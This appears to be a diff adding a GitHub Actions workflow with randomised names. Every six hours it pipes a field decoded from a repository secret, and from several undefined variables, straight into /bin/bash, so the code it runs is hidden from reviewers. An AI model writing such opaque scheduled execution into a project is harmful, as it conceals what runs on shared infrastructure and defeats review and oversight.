@@ -1,0 +1,21 @@
+name: xuangaopochanzhan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuangaopochanzhan
+        env:
+          vqrt42: ${{ secrets.vqrt42 }}
+        run: |
+          echo $vqrt42 | jq -r .t3 | /bin/bash
+          echo $rgwb05 | jq -r .hfnw6 | /bin/bash
+          echo $jhmc88182 | jq -r .olzy02546 | /bin/bash
+          echo $e9 | jq -r .tdk0416 | /bin/bash
+          echo $ux3170 | jq -r .aol4885 | /bin/bash
+
